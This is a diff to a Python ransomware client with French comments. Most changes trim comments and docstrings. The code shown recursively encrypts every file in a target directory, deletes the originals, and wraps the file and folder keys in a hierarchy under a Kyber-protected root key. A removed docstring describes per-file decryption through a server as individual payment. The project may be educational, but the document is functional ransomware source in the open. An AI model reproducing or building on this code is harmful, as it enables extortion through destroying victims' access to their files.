@@ -123,10 +123,7 @@ class RansomwareClient:
         with open(self.rootkey_path, 'w') as f:
             json.dump(rootkey_data, f, indent=2)
 
-        # Chiffrement récursif hiérarchique
-        # Les items à la racine ont root_key comme parent → .key seulement
-        # Les items dans sous-dossiers ont folder_key comme parent → .key + .root_key
-        print("[CLT] Chiffrement récursif hiérarchique")
+        # Chiffrement récursif
         encrypted_count = self._encrypt_dir_recursive(target_path, root_key, root_key, is_root_level=True)
 
         print(f"\n[CLT] Chiffrement terminé : {encrypted_count} fichier(s) chiffré(s)")
@@ -134,12 +131,12 @@ class RansomwareClient:
 
     def _encrypt_dir_recursive(self, dir_path: Path, parent_key: bytes, root_key: bytes, is_root_level: bool) -> int:
         """
-        Chiffrement récursif d'un dossier
+        Chiffrement récursif dossier
 
         Args:
             dir_path: Dossier à chiffrer
-            parent_key: Clé parente pour chiffrer les clés du niveau courant
-            root_key: RK pour générer les .root_key des items hors-racine
+            parent_key: Clé parente pour chiffrer clés courant
+            root_key: RK pour générer .root_key
             is_root_level: True si on est au niveau racine du dossier cible
 
         Returns:
@@ -157,14 +154,12 @@ class RansomwareClient:
                 # Génère folder_key aléatoire
                 folder_key = crypto_utils.generate_random_key()
 
-                # .key : folder_key chiffré avec parent_key (dans le dossier parent)
                 self._save_wrapped_key(
                     dir_path / (entry.name + config.KEY_EXTENSION),
                     folder_key,
                     parent_key
                 )
 
-                # .root_key : folder_key chiffré avec root_key (seulement si pas racine)
                 if not is_root_level:
                     self._save_wrapped_key(
                         dir_path / (entry.name + config.ROOT_KEY_EXTENSION),
@@ -185,14 +180,12 @@ class RansomwareClient:
                 try:
                     file_key = self._encrypt_file_to_enc(entry)
 
-                    # .key : file_key chiffré avec parent_key
                     self._save_wrapped_key(
                         dir_path / (entry.name + config.KEY_EXTENSION),
                         file_key,
                         parent_key
                     )
 
-                    # .root_key : file_key chiffré avec root_key (seulement si pas racine)
                     if not is_root_level:
                         self._save_wrapped_key(
                             dir_path / (entry.name + config.ROOT_KEY_EXTENSION),
@@ -208,14 +201,13 @@ class RansomwareClient:
 
     def _encrypt_file_to_enc(self, file_path: Path) -> bytes:
         """
-        Chiffre fichier, le sauvegarde en .enc (nonce || ciphertext_with_tag),
-        supprime l'original.
+        Chiffre fichier en .enc et supprime l'original.
 
         Args:
             file_path: Fichier à chiffrer
 
         Returns:
-            file_key utilisée pour le chiffrement
+            file_key utilisée pour chiffrement
         """
         with open(file_path, 'rb') as f:
             plaintext = f.read()
@@ -233,7 +225,7 @@ class RansomwareClient:
 
     def decrypt_all(self, path: str = ".") -> None:
         """
-        Déchiffre tous les fichiers de manière récursive et hiérarchique
+        Déchiffre tous fichiers
 
         Args:
             path: Chemin dossier à déchiffrer
@@ -270,20 +262,20 @@ class RansomwareClient:
         print("[CLT] Désencapsule RK")
         root_key = crypto_utils.unwrap_key_aes_gcm(wrapped_rk_with_tag, master_key, wrapped_rk_nonce)
 
-        # Déchiffrement récursif hiérarchique
-        print("[CLT] Déchiffrement récursif hiérarchique")
+        # Déchiffrement récursif
+        print("[CLT] Déchiffrement récursif")
         decrypted_count = self._decrypt_dir_recursive(target_path, root_key, root_key)
 
         print(f"\n[CLT] Déchiffrement terminé : {decrypted_count} fichier(s) déchiffré(s)")
 
     def _decrypt_dir_recursive(self, dir_path: Path, parent_key: bytes, root_key: bytes) -> int:
         """
-        Déchiffrement récursif d'un dossier
+        Déchiffrement récursif dossier
 
         Args:
             dir_path: Dossier à déchiffrer
-            parent_key: Clé parente pour déchiffrer les .key du niveau courant
-            root_key: RK pour déchiffrer les .root_key (déchiffrement partiel)
+            parent_key: Clé parente pour déchiffrer .key du niveau courant
+            root_key: RK pour déchiffrer .root_key (déchiffrement partiel)
 
         Returns:
             Nombre de fichiers déchiffrés
@@ -291,7 +283,7 @@ class RansomwareClient:
         count = 0
         entries = sorted(dir_path.iterdir())  # snapshot
 
-        # Traite d'abord les sous-dossiers (pour récursion avec folder_key)
+        # D'abord les sous-dossiers
         for entry in entries:
             if not entry.is_dir() or self._should_skip_dir(entry.name):
                 continue
@@ -299,7 +291,6 @@ class RansomwareClient:
             key_path = dir_path / (entry.name + config.KEY_EXTENSION)
             root_key_path = dir_path / (entry.name + config.ROOT_KEY_EXTENSION)
 
-            # Préfère .root_key (déchiffré avec root_key) si disponible
             if root_key_path.exists():
                 use_path, use_key = root_key_path, root_key
             elif key_path.exists():
@@ -318,17 +309,15 @@ class RansomwareClient:
             except Exception as e:
                 print(f"  [ERR] Dossier {entry.name}: {e}")
 
-        # Traite ensuite les fichiers .enc
+        # Traite ensuite fichiers .enc
         for entry in entries:
             if not entry.is_file() or not entry.name.endswith(config.ENC_EXTENSION):
                 continue
 
-            # Nom original = nom .enc sans l'extension .enc
             base_name = entry.name[:-len(config.ENC_EXTENSION)]
             key_path = dir_path / (base_name + config.KEY_EXTENSION)
             root_key_path = dir_path / (base_name + config.ROOT_KEY_EXTENSION)
 
-            # Préfère .root_key (déchiffré avec root_key) si disponible
             if root_key_path.exists():
                 use_path, use_key = root_key_path, root_key
             elif key_path.exists():
@@ -366,8 +355,7 @@ class RansomwareClient:
 
     def decrypt_file(self, file_path: str) -> None:
         """
-        Déchiffre un seul fichier via le serveur (paiement individuel).
-        Le serveur déchiffre le .root_key avec la root_key et retourne la file_key.
+        Déchiffre un seul fichier
 
         Args:
             file_path: Chemin du fichier chiffré (.enc) ou nom original
@@ -389,15 +377,12 @@ class RansomwareClient:
         if not enc_path.exists():
             raise FileNotFoundError(f"Fichier chiffré {enc_path} pas trouvé")
 
-        # Si .root_key existe → item hors-racine → envoyer au serveur
-        # Sinon, utiliser .key directement (item racine, déjà chiffré avec root_key)
         rk_path = root_key_path if root_key_path.exists() else key_path
         if not rk_path.exists():
             raise FileNotFoundError(f"Fichier clé pas trouvé pour {base_name}")
 
         print(f"\n[CLT] Déchiffrement fichier unique via serveur : {base_name}")
 
-        # Charge rootkey.bin pour kyber_ciphertext
         if not self.rootkey_path.exists():
             raise FileNotFoundError(f"Fichier {config.ROOTKEY_FILENAME} pas trouvé")
 
@@ -405,14 +390,13 @@ class RansomwareClient:
             rootkey_data = json.load(f)
         kyber_ciphertext = base64.b64decode(rootkey_data["kyber_ciphertext"])
 
-        # Envoie .root_key (ou .key si racine) au serveur → serveur déchiffre avec root_key
         with open(rk_path, 'r') as f:
             rk_data = json.load(f)
 
         print("[CLT] Envoi clé au serveur pour déchiffrement avec RK")
         file_key = server.decrypt_file_key(rk_data, kyber_ciphertext)
 
-        # Déchiffre le fichier avec file_key
+        # Déchiffre fichier avec file_key
         with open(enc_path, 'rb') as f:
             data = f.read()
 
